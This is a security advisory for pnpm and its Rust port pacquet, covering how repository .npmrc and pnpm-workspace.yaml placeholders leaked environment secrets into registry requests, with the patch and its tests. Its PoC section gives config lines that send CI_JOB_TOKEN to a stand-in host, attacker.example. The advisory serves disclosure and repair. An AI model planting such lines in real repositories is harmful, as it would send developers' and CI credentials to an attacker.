# [M] pnpm: Repository config can expand victim environment secrets into registry requests before scripts run

## Summary
Severity: Medium
Advisory: GHSA-3qhv-2rgh-x77r
CVE: CVE-2026-55180
CWE: CWE-200, CWE-201, CWE-522
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-3qhv-2rgh-x77r
Type: github-advisory

## Affected
- npm: `pnpm` — affected >=0 <10.34.2
- npm: `pnpm` — affected >=11.0.0 <11.5.3

## Details
<!-- maintainer-action:start -->
## Maintainer Action Plan

This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.

- Advisory: `CAND-PNPM-122` / `GHSA-3qhv-2rgh-x77r`
- Advisory URL: https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r
- Shared patch PR: https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1
- Shared patch branch: `security/ghsa-batch-2026-06-09`
- Patch commit: `a93449314f398cf4bdf2e28d033c02d37395ad22`
- Base commit: `origin/main` `55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec`
- Maintainer priority: `start-here`
- Component: `pnpm config/env replacement and registry auth`
- Patch area: project .npmrc env placeholders are not expanded into registry/auth destinations
- Affected packages: `npm:pnpm`, `npm:@pnpm/config.reader`, `rust:pacquet`
- CWE IDs: `CWE-201`, `CWE-200`, `CWE-522`
- Conservative CVSS: `6.5` / `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`
- Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.

### Expected Patched Behavior

Project `.npmrc` environment placeholders do not expand into registry or auth destinations; the secret is absent from the request URL and auth header.

### Files And Tests To Review

- `config/reader/src/loadNpmrcFiles.ts`
- `config/reader/src/getOptionsFromRootManifest.ts`
- `config/reader/test/index.ts`
- `config/reader/test/getOptionsFromRootManifest.test.ts`
- `pacquet/crates/config/src/npmrc_auth.rs`
- `pacquet/crates/config/src/npmrc_auth/tests.rs`
- `pacquet/crates/config/src/workspace_yaml.rs`
- `pacquet/crates/config/src/workspace_yaml/tests.rs`
- `.changeset/sharp-registry-env-placeholders.md`

### Focused Validation

Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.

```bash
./node_modules/.bin/tsgo --build config/reader/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/getOptionsFromRootManifest.test.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "project \.npmrc does not expand env variables in registry URLs|project \.npmrc does not expand env variables in scoped registry URLs or URL-scoped keys|project \.npmrc does not expand env variables in auth values|user \.npmrc may expand env variables in registry URLs|drops the placeholder when the env var is unset|substitutes normally when the env var is set|only drops the unresolved placeholder|explicit .*undefined.* fallbacks|pnpm-workspace\.yaml registries do not expand env variables|return a warning when the \.npmrc has an env variable" --runInBand
./node_modules/.bin/eslint config/reader/src/loadNpmrcFiles.ts config/reader/src/getOptionsFromRootManifest.ts config/reader/test/index.ts config/reader/test/getOptionsFromRootManifest.test.ts
cargo fmt --manifest-path pacquet/crates/config/Cargo.toml --check
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_scoped_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_url_scoped_keys --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_auth_values --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml trusted_ini_expands_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml ignores_env_vars_inside_workspace_registry_values --lib
git diff --check
cargo fmt --check
```

The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is `results/CAND-PNPM-122-patched-result.json`.
<!-- maintainer-action:end -->

# CAND-PNPM-122: Repository config can expand victim environment secrets into registry requests before scripts run

## Advisory Details

### Summary

pnpm and pacquet expanded `${ENV_VAR}` placeholders from repository-controlled `.npmrc` and `pnpm-workspace.yaml` into registry request destinations and registry credentials. A malicious repository could cause dependency resolution to send victim environment secrets to an attacker-selected registry before lifecycle scripts run.

### Details

The vulnerable TypeScript pnpm path was:

- `config/reader/src/loadNpmrcFiles.ts` loaded project `.npmrc` and substituted environment placeholders in keys and values.
- `config/reader/src/getOptionsFromRootManifest.ts` substituted environment placeholders inside workspace `registry`, `registries`, and `namedRegistries` settings.
- `config/reader/src/index.ts` merged those expanded registry/auth values into `pnpmConfig.registries`, `pnpmConfig.authConfig`, and `pnpmConfig.configByUri`.
- `resolving/npm-resolver/src/fetch.ts` built metadata request URLs from the selected registry.
- `network/fetch/src/fetchFromRegistry.ts` dispatched the request and attached matching auth headers before install lifecycle scripts could run.

The pacquet parity path was:

- `pacquet/crates/config/src/npmrc_auth.rs` expanded project `.npmrc` placeholders while parsing registry URLs and auth values.
- `pacquet/crates/config/src/workspace_yaml.rs` expanded workspace registry placeholders.
- `pacquet/crates/resolving-npm-resolver/src/fetch_full_metadata.rs` used the configured registry URL and `AuthHeaders` for metadata fetches.

### PoC

Repository `.npmrc` URL-path exfiltration:

```ini
registry=https://attacker.example/${CI_JOB_TOKEN}/
```

Repository `.npmrc` auth-header exfiltration:

```ini
registry=https://attacker.example/
//attacker.example/:_authToken=${CI_JOB_TOKEN}
```

Repository `pnpm-workspace.yaml` URL-path exfiltration:

```yaml
registries:
  default: https://attacker.example/${CI_JOB_TOKEN}/
namedRegistries:
  work: https://attacker.example/${CI_JOB_TOKEN}/npm/
```

Exploit method:

1. The victim checks out the repository and runs a pnpm or pacquet dependency-management command with `CI_JOB_TOKEN` or another sensitive environment variable present.
2. Before the patch, repository config expanded the placeholder to the victim secret.
3. The resolver used the expanded registry or matching auth entry to construct a metadata request.
4. The victim sent a request such as `https://attacker.example/<secret>/<package>` or `Authorization: Bearer <secret>` to the attacker-controlled endpoint.

Validation PoC:

The PoC models the pre-patch URL and Authorization-header leaks, then verifies that patched pnpm and pacquet do not keep the secret in repository-controlled registry destinations or credential values.

### Impact

A malicious repository can disclose environment secrets present in a developer or CI process to a repository-selected registry before script controls apply. This can expose npm tokens, CI job tokens, OIDC helper inputs, or other conventional environment secrets if the attacker knows or guesses their names.

## Affected Products

Ecosystem: npm

Package name: `pnpm`, `@pnpm/config.reader`; pacquet Rust port

Affected versions: current main before this patch, when project `.npmrc` or `pnpm-workspace.yaml` contains environment placeholders in registry request destinations or project `.npmrc` contains environment placeholders in registry credential values.

Patched versions: pending release containing this patch.

## Severity

Severity before patch: High

Vector string before patch: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`

Score before patch: 7.4

Severity after patch: None

Vector string after patch: not vulnerable after patch

Score after patch: 0.0

Rationale: exploitation is remote and low complexity once a victim runs pnpm or pacquet in the malicious repository. No attacker privileges are required, but user interaction is required. The demonstrated sink is secret disclosure through outbound registry requests, not arbitrary code execution, so confidentiality is high while integrity and availability are not directly impacted by this finding. After the patch, repository-controlled registry destinations and credential values containing env placeholders are ignored, while trusted user/global/auth.ini/CLI config still expands.

## Weaknesses

CWE-201: Insertion of Sensitive Information Into Sent Data

CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

CWE-522: Insufficiently Protected Credentials

## Patch

The patch makes environment expansion trust-aware for registry requests:

- Project `.npmrc` no longer expands `${...}` in `registry`, `@scope:registry`, proxy URL values, URL-scoped keys such as `//host/${SECRET}/:_authToken`, or registry credential values such as `//host/:_authToken=${SECRET}` and `_authToken=${SECRET}`.
- User `.npmrc`, auth.ini, CLI, global, and environment config still support env expansion for trusted registry configuration.
- `pnpm-workspace.yaml` no longer expands `${...}` in `registry`, `registries`, or `namedRegistries` URL values.
- Trusted user-level auth values such as `//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}` still expand or lossy-drop as before, preserving setup-node and OIDC trusted-publishing behavior when the `.npmrc` is supplied as user config.
- Pacquet mirrors the same boundary with `from_project_ini()` for project `.npmrc` and workspace registry filtering.

Changed files:

- `config/reader/src/loadNpmrcFiles.ts`
- `config/reader/src/getOptionsFromRootManifest.ts`
- `config/reader/test/index.ts`
- `config/reader/test/getOptionsFromRootManifest.test.ts`
- `pacquet/crates/config/src/npmrc_auth.rs`
- `pacquet/crates/config/src/npmrc_auth/tests.rs`
- `pacquet/crates/config/src/workspace_yaml.rs`
- `pacquet/crates/config/src/workspace_yaml/tests.rs`

Changeset:

- `.changeset/sharp-registry-env-placeholders.md`

Pacquet parity:

Ported in the same patch. Pacquet dependency-management commands now parse project `.npmrc` with request-destination and credential-value env expansion disabled, and drop workspace registry values containing `${...}` placeholders.

## Verification

Post-patch validation:

The PoC ran:

```bash
./node_modules/.bin/tsgo --build config/reader/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/getOptionsFromRootManifest.test.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "project \.npmrc does not expand env variables in registry URLs|project \.npmrc does not expand env variables in scoped registry URLs or URL-scoped keys|project \.npmrc does not expand env variables in auth values|user \.npmrc may expand env variables in registry URLs|drops the placeholder when the env var is unset|substitutes normally when the env var is set|only drops the unresolved placeholder|explicit .*undefined.* fallbacks|pnpm-workspace\.yaml registries do not expand env variables|return a warning when the \.npmrc has an env variable" --runInBand
./node_modules/.bin/eslint config/reader/src/loadNpmrcFiles.ts config/reader/src/getOptionsFromRootManifest.ts config/reader/test/index.ts config/reader/test/getOptionsFromRootManifest.test.ts
cargo fmt --manifest-path pacquet/crates/config/Cargo.toml --check
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_scoped_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_url_scoped_keys --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_auth_values --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml trusted_ini_expands_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml ignores_env_vars_inside_workspace_registry_values --lib
git diff --check
```

Results:

- PoC pre-patch model showed `cand122-ci-job-token` in both a request URL and a bearer auth header.
- TypeScript build for `config.reader`: passed.
- Focused root-manifest tests: 8 passed, including workspace registry and named-registry placeholder denial.
- Focused config-reader integration tests: 10 passed, covering project `.npmrc` default registry denial, scoped registry denial, URL-scoped-key denial, project auth-value denial, trusted user `.npmrc` registry expansion, trusted user auth-value expansion/lossy fallback, and workspace registry denial.
- `cargo fmt --check`: passed.
- Focused pacquet tests: 6 passed, covering project `.npmrc` registry denial, scoped registry denial, URL-scoped-key denial, auth-value denial, trusted `.npmrc` registry expansion, and workspace YAML denial.
- `git diff --check`: passed.

## CVSS Reassessment

The initial scan score used a repository-code-execution vector:

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` (8.8 High)

The PoC and source trace showed this finding is direct secret disclosure through registry request URLs or Authorization headers, not a code execution path. The corrected vulnerable vector is:

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`

Corrected vulnerable score: 7.4 High.

Final score after patch: 0.0.

## References
- https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r
- https://nvd.nist.gov/vuln/detail/CVE-2026-55180
- https://github.com/pnpm/pnpm
